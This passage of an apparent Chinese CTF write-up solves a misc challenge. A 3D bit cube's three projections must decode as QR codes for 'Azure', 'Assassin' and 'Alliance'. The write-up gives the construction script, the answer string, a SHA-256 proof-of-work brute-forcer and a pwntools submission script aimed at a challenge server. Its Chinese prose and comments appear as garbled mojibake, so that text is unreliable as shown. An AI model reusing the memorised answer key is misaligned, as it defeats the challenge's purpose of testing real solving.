decode_qr(create_image(projection))<br>            <span class="hljs-keyword">if</span> content != word:<br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Invalid content&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-built_in">print</span>(f.read())<br><span class="hljs-comment"># 5i1enceeï¼šä¸‰é¢çš„æŠ•å½±ç”Ÿæˆçš„äºŒç»´ç è§£ç å‡ºæ¥çš„è¦å¯¹åº”é‚£ä¸‰ä¸ªå­—ç¬¦ä¸²çš„è¯´</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>æ ¹æ®æºç ï¼Œæˆ‘ä»¬è¦å…ˆé€šè¿‡ <code>proof_of_work()</code>ï¼ˆé˜²çˆ†ç ´çš„ï¼Ÿsha256 çˆ†ä¸€ä¸‹å°±èƒ½è¿‡ï¼‰ï¼Œç„¶åæäº¤é•¿åº¦ä¸º 21*21*21 ä¸” 1 çš„æ•°é‡å°äº 390 çš„ 01 å­—ç¬¦ä¸²ï¼Œè¯»ä¸º 21*21*21 çš„ä¸‰ç»´çŸ©é˜µï¼Œè€Œåå¯¹ frontã€leftã€top ä¸‰é¢è¿›è¡ŒæŠ•å½±ï¼ˆæœ‰ 1 åˆ™ 1ï¼Œæ—  1 åˆ™ 0ï¼‰ï¼ŒæŠ•å½±åäº§ç”Ÿçš„ä¸‰ä¸ªäºŒç»´çŸ©é˜µåˆ†åˆ«ç”Ÿæˆä¸‰ä¸ªå›¾åƒå¹¶æŒ‰äºŒç»´ç è§£ç ï¼Œå¾—åˆ°çš„ä¸‰ä¸ªå­—ç¬¦ä¸²å†…å®¹è¦åˆ†åˆ«ç­‰äºâ€Azureâ€, â€œAssassinâ€, â€œAllianceâ€ï¼Œæœ€åå¾—åˆ° flagã€‚</p><p>é‚£ä¹ˆè¦æäº¤ç¬¦åˆè¦æ±‚çš„ 01 å­—ç¬¦ä¸²å°±å…ˆä¸Šè¿°æµç¨‹åæ¨ä¸€ä¸‹å†™ä¸ªè„šæœ¬ï¼šå…ˆæ ¹æ®â€Azureâ€, â€œAssassinâ€, â€œAllianceâ€ç”Ÿæˆä¸‰ä¸ªäºŒç»´ç çš„ 21*21 äºŒç»´çŸ©é˜µï¼Œç„¶åå°†ä¸‰ä¸ªäºŒç»´çŸ©é˜µå¯¹åº”ä¸‰é¢åˆå¹¶å…¥ä¸€ä¸ªä¸‰ç»´çŸ©é˜µä¸­ï¼Œå¦‚ä½•åˆå¹¶åˆ™è¦è€ƒè™‘å¦‚ä½•å°½å¯èƒ½çš„å¤ç”¨ 1 å‡å°‘å‡ºç°æ¬¡æ•°ã€‚</p><p>ç¬¬ä¸€æ¬¡çš„æƒ³æ³•æœ€ç®€å•ï¼Œè®©æœ€å¤–å±‚é‚£ä¸‰é¢åŸæ¨¡åŸæ ·æ”¾ä¸Šå»ï¼Œå…¶ä»–é¢å’Œå†…éƒ¨å…¨ç½® 0ï¼Œæœ¬åœ°æµ‹è¯•å‘ç° 1 çš„æ•°é‡è¶…æ ‡äº†ã€‚</p><p>æ‰€ä»¥åé¢å†åŠ äº†ä¸€æ®µä»£ç å¤„ç†ï¼Œå°±æ˜¯æŠŠä¸Šä¸€æ­¥å®Œæˆåï¼Œå½“å†…éƒ¨æŸç‚¹çš„ä¸‰ä¸ªæŠ•å½±é¢åŒæ—¶ç”¨åˆ° 1 æ—¶å°±å°†å†…éƒ¨è¯¥ç‚¹ç½® 1ï¼Œæœ€å¤–å±‚å¯¹åº”ä¸‰ç‚¹ç½® 0ï¼Œè¿™æ ·æ¯æœ‰ä¸€ä¸ªåŒæ—¶éœ€è¦ä¸‰é¢æŠ•å½±çš„ç‚¹å°±å¯ä»¥å‡å°‘ä¸¤ä¸ª 1 çš„ä½¿ç”¨ï¼Œæœ¬åœ°è¿è¡ŒæˆåŠŸé€šè¿‡é™åˆ¶ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import qrcode<br><br>def generate_qr_matrix(text):<br>    qr = qrcode.<span class="hljs-symbol">QRCode</span>(<br>        version=<span class="hljs-number">1</span>,  # <span class="hljs-number">21</span>*<span class="hljs-number">21</span><br>        error_correction=qrcode.constants.<span class="hljs-symbol">ERROR_CORRECT_L</span>,<br>        box_size=<span class="hljs-number">1</span>,<br>        border=<span class="hljs-number">0</span>,<br>    )<br>    qr.add_data(text)<br>    qr.make(fit=<span class="hljs-symbol">True</span>)<br>    img = qr.get_matrix()<br>    return [[cell for cell in row] for row in img]<br><br><br>def construct_3d_matrix(azure, assassin, alliance):<br>    data = [[[<span class="hljs-symbol">False</span> for <span class="hljs-symbol">___</span> in range(<span class="hljs-number">21</span>)] for <span class="hljs-symbol">__</span> in range(<span class="hljs-number">21</span>)] for <span class="hljs-symbol">_</span> in range(<span class="hljs-number">21</span>)]<br>    # <span class="hljs-symbol">Front</span>æŠ•å½±ï¼šx-y <span class="hljs-symbol">Azure</span><br>    for x in range(<span class="hljs-number">21</span>):<br>        for y in range(<span class="hljs-number">21</span>):<br>            if azure[x][y]:<br>                data[x][y][<span class="hljs-number">0</span>] = <span class="hljs-symbol">True</span><br>    # <span class="hljs-symbol">Left</span>ï¼šy-z <span class="hljs-symbol">Assassin</span><br>    for y in range(<span class="hljs-number">21</span>):<br>        for z in range(<span class="hljs-number">21</span>):<br>            if assassin[y][z]:<br>                data[<span class="hljs-number">0</span>][y][z] = <span class="hljs-symbol">True</span><br>                print(<span class="hljs-string">&quot;1&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            else:<br>                print(<span class="hljs-string">&quot;0&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        print()<br>    # <span class="hljs-symbol">Top</span>ï¼šx-z <span class="hljs-symbol">Alliance</span><br>    for x in range(<span class="hljs-number">21</span>):<br>        for z in range(<span class="hljs-number">21</span>):<br>            if alliance[x][z]:<br>                data[x][<span class="hljs-number">0</span>][z] = <span class="hljs-symbol">True</span><br>    # è¿™é‡Œå¾—ä»<span class="hljs-number">1</span>åˆ°<span class="hljs-number">21</span>ï¼ŒåŸæœ¬å†™å¾—<span class="hljs-number">0</span>åˆ°<span class="hljs-number">21</span>ï¼Œå¯¼è‡´æœ€å¤–å±‚çš„é¢é‡å¤æ“ä½œäº†<br>    for x in range(<span class="hljs-number">1</span>,<span class="hljs-number">21</span>):<br>        for y in range(<span class="hljs-number">1</span>,<span class="hljs-number">21</span>):<br>            for z in range(<span class="hljs-number">1</span>,<span class="hljs-number">21</span>):<br>                if data[x][y][<span class="hljs-number">0</span>] and data[<span class="hljs-number">0</span>][y][z] and data[x][<span class="hljs-number">0</span>][z]:<br>                    data[x][y][z] = <span class="hljs-symbol">True</span><br>                    data[x][y][<span class="hljs-number">0</span>] = <span class="hljs-symbol">False</span><br>                    data[<span class="hljs-number">0</span>][y][z] = <span class="hljs-symbol">False</span><br>                    data[x][<span class="hljs-number">0</span>][z] = <span class="hljs-symbol">False</span><br><br>    return data<br><br>def data_to_input(data):<br>    input_str = []<br>    for z in range(<span class="hljs-number">21</span>):<br>        for y in range(<span class="hljs-number">21</span>):<br>            for x in range(<span class="hljs-number">21</span>):<br>                input_str.append(<span class="hljs-string">&#x27;1&#x27;</span> if data[x][y][z] else <span class="hljs-string">&#x27;0&#x27;</span>)<br>    return <span class="hljs-string">&#x27;&#x27;</span>.join(input_str)<br><br><br>azure = generate_qr_matrix(<span class="hljs-string">&quot;Azure&quot;</span>)<br>assassin = generate_qr_matrix(<span class="hljs-string">&quot;Assassin&quot;</span>)<br>alliance = generate_qr_matrix(<span class="hljs-string">&quot;Alliance&quot;</span>)<br><br>data1 = construct_3d_matrix(azure, assassin, alliance)<br><br>data = data_to_input(data1)<br>print(any(not c in <span class="hljs-string">&quot;01&quot;</span> for c in data))<br>print(len(data) != <span class="hljs-number">21</span> * <span class="hljs-number">21</span> * <span class="hljs-number">21</span>)<br>print(data.count(<span class="hljs-string">&quot;1&quot;</span>) &gt;= <span class="hljs-number">390</span>)<br>print(data.count(<span class="hljs-string">&quot;1&quot;</span>))<br>print(data)<br></code></pre></td></tr></table></figure><p>å¾—åˆ° data å¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">111111101011101111111100000000000000000000100000000000000001001100000000000000000101100000000000000001001100000000000101000001100000000000000010001000000000100000000000110000000000000110011100000010000100001000100000000000001010000100001010000000001100100000010000011001001000000000000001000001110000000000000000111100000000000000000101100110100010000000000100100000010100000000100000000010010000000100000001010001000000100110000000100010000100000000000001000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000010000000000000000000000000000000000000000000100000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000100000000000001000000000000000000000000000001000000000000000000000100000000000000000000010000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000100000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000001000000000000000000000000000100000000000000000001000000000000000000000000000000000000000000001100000000001001000001000000000000000000000000100000000000000000001000000000000000000000000100000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000100100000000000000000000100000000000000000000000000000000000000000000000000000000001000100000000100001001001000000000000000000000000010000000000000000000000100000000000000001000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000010000000000001000000000000000000000000000000100000000000000000000000100000000000000000000100000000101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000100000000000000000000000000000000001100000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000100000000000000000101000000100000000000000000000000000001000000000010000000000000000000100000000000000000000000001000000000000010000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000001000000000000000000000000010000000000000000000000000000010000000000000000010000100000000000000000000000000000000000001000100000000000000000000000000001110100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001111000000000000000000000000000000000000000000000000000100000000000000000001000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000100000000000000000000000000000000000000000000000001000000000000000100000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000010000000100000000000000000010000000001000000000000000000000100000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000001000000000000000100000000000000000000000000000000000000000000000000000000100000100000000000000000000000000000000000000000001000000000000000000100000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000100000000000000000101000000000000000000000000000000000000000000000000000000000010000000000000100000000000000000100000000000000000000000000000001000100000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000100010010000010000000000000000000000000001000000000000000000000000000000010000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100000011000000011000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000100000000000000000000000000100000100000000000000000000000000000000010000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000010000000000000000000000100000000000000100000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000100001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000100000000000000000000000010000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000100001000000010100000000000000000001000000000000100000000000000100000000000000000000100000000000000000000100000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000010000000000000000000100000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000100000000000000001001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000100000000000000000000000000000000010000000000000000000000000000000000000000000100000100000000000000000000100010000100000101000000000000000000000000000000000001000000000100000000000000000000000000000000000010000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000100000000000000000000000000010000000000000000000000000000100110001000000100000000000000000000000000000000000000000000100100000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000001000000000000000000000000000000100000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000010000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000001000000000000000000100010000000000100010000000000000000000000100000000000000000000000000000000001000000000000000010000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000100000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000100000000000000001000000000000000000000000000001000000000000000000000000000000100000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000001100000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000100000000000000110001100100000000000100000000000000000000000000000000000010000100000000000000000000100000000000000000000100000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000100000000000000000000001000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000<br></code></pre></td></tr></table></figure><p>01 å­—ç¬¦ä¸²æœ‰äº†ï¼Œ<code>proof_of_work()</code> ç”¨ä¸‹é¢è„šæœ¬çˆ†å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><br>suffix = <span class="hljs-string">&quot;ASIBeo2zoqXwSevw&quot;</span><br>target_prefix = <span class="hljs-string">&quot;f7f0f44df6bdf6d99248e7881dec26031b0a27a7b7e2c12522f0e8607fb1f48b&quot;</span><br><br><span class="hljs-comment"># å°è¯•æ‰€æœ‰é•¿åº¦ä¸º4çš„ASCIIå¯æ‰“å°å­—ç¬¦ç»„åˆ</span><br>charset = string.ascii_letters + string.digits<br><br><span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">4</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(prefix) + suffix<br>    hash_val = hashlib.sha256(candidate.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> hash_val.startswith(target_prefix):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Found match: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(prefix)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;SHA256(&#x27;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(prefix)&#125;</span><span class="hljs-subst">&#123;suffix&#125;</span>&#x27;) = <span class="hljs-subst">&#123;hash_val&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>æœ€åå‰é¢çš„éƒ½å¯¹äº†ï¼Œæœ¬åœ°å®Œå…¨é€šè¿‡äº†ï¼Œä½†å› ä¸º netcat çš„è¾“å…¥é•¿åº¦é™åˆ¶ï¼Œç›´æ¥ nc æœåŠ¡ç«¯æ²¡æ³•æŠŠå®Œæ•´ data ä¼ è¾“è¿‡å»ï¼Œæ‰€ä»¥åˆæŠ˜è…¾äº†ä¸€ä¸‹ã€‚z221x å¸ˆå‚…ç»™äº†ä¸ªè„šæœ¬ï¼Œæœ€åç»ˆäºæ˜¯æˆäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> re<br><br>flag=<span class="hljs-string">&quot;111111101011101111111100000000000000000000100000000000000001001100000000000000000101100000000000000001001100000000000101000001100000000000000010001000000000100000000000110000000000000110011100000010000100001000100000000000001010000100001010000000001100100000010000011001001000000000000001000001110000000000000000111100000000000000000101100110100010000000000100100000010100000000100000000010010000000100000001010001000000100110000000100010000100000000000001000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000010000000000000000000000000000000000000000000100000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000100000000000001000000000000000000000000000001000000000000000000000100000000000000000000010000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000100000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000001000000000000000000000000000100000000000000000001000000000000000000000000000000000000000000001100000000001001000001000000000000000000000000100000000000000000001000000000000000000000000100000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000100100000000000000000000100000000000000000000000000000000000000000000000000000000001000100000000100001001001000000000000000000000000010000000000000000000000100000000000000001000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000010000000000001000000000000000000000000000000100000000000000000000000100000000000000000000100000000101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000100000000000000000000000000000000001100000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000100000000000000000101000000100000000000000000000000000001000000000010000000000000000000100000000000000000000000001000000000000010000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000001000000000000000000000000010000000000000000000000000000010000000000000000010000100000000000000000000000000000000000001000100000000000000000000000000001110100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001111000000000000000000000000000000000000000000000000000100000000000000000001000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000100000000000000000000000000000000000000000000000001000000000000000100000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000010000000100000000000000000010000000001000000000000000000000100000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000001000000000000000100000000000000000000000000000000000000000000000000000000100000100000000000000000000000000000000000000000001000000000000000000100000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000100000000000000000101000000000000000000000000000000000000000000000000000000000010000000000000100000000000000000100000000000000000000000000000001000100000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000100010010000010000000000000000000000000001000000000000000000000000000000010000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100000011000000011000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000100000000000000000000000000100000100000000000000000000000000000000010000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000010000000000000000000000100000000000000100000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000100001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000100000000000000000000000010000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000100001000000010100000000000000000001000000000000100000000000000100000000000000000000100000000000000000000100000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000010000000000000000000100000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000100000000000000001001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000100000000000000000000000000000000010000000000000000000000000000000000000000000100000100000000000000000000100010000100000101000000000000000000000000000000000001000000000100000000000000000000000000000000000010000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000100000000000000000000000000010000000000000000000000000000100110001000000100000000000000000000000000000000000000000000100100000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000001000000000000000000000000000000100000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000010000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000001000000000000000000100010000000000100010000000000000000000000100000000000000000000000000000000001000000000000000010000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000100000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000100000000000000001000000000000000000000000000001000000000000000000000000000000100000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000001100000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000100000000000000110001100100000000000100000000000000000000000000000000000010000100000000000000000000100000000000000000000100000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000100000000000000000000001000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000&quot;</span><br><span class="hljs-comment"># è¿æ¥åˆ°ç›®æ ‡æœåŠ¡ï¼Œè¿™é‡Œå‡è®¾æœåŠ¡åœ¨æœ¬åœ° 1234 ç«¯å£ï¼Œä½ éœ€è¦æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹</span><br>conn = remote(<span class="hljs-string">&#x27;1.95.71.197&#x27;</span>, <span class="hljs-number">9999</span>)<br><br><span class="hljs-comment"># æ¥æ”¶æœåŠ¡çš„å›æ˜¾ä¿¡æ¯</span><br>echo = conn.recvline().decode()<br><br><span class="hljs-comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–åç¼€å’Œç›®æ ‡å“ˆå¸Œå€¼</span><br>pattern = <span class="hljs-string">r&#x27;sha256\(XXXX\+(\w+)\) == (\w+)&#x27;</span><br><span class="hljs-keyword">match</span> = re.search(pattern, echo)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>    log.error(<span class="hljs-string">&quot;Failed to extract suffix and target hash from the echo.&quot;</span>)<br>    conn.close()<br>    exit(<span class="hljs-number">1</span>)<br><br>suffix = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>target_prefix = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># å­—ç¬¦é›†ï¼ŒåŒ…å«æ‰€æœ‰å­—æ¯å’Œæ•°å­—</span><br>charset = string.ascii_letters + string.digits<br><br><span class="hljs-comment"># å°è¯•æ‰€æœ‰é•¿åº¦ä¸º 4 çš„ ASCII å¯æ‰“å°å­—ç¬¦ç»„åˆ</span><br><span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">4</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(prefix) + suffix<br>    hash_val = hashlib.sha256(candidate.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> hash_val.startswith(target_prefix):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Found match: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(prefix)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;SHA256(&#x27;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(prefix)&#125;</span><span class="hljs-subst">&#123;suffix&#125;</span>&#x27;) = <span class="hljs-subst">&#123;hash_val&#125;</span>&quot;</span>)<br>        <span class="hljs-comment"># å°†æ‰¾åˆ°çš„å‰ç¼€å‘é€ç»™æœåŠ¡</span><br>        conn.sendline(<span class="hljs-string">&#x27;&#x27;</span>.join(prefix).encode())<br><br>        <span class="hljs-comment"># 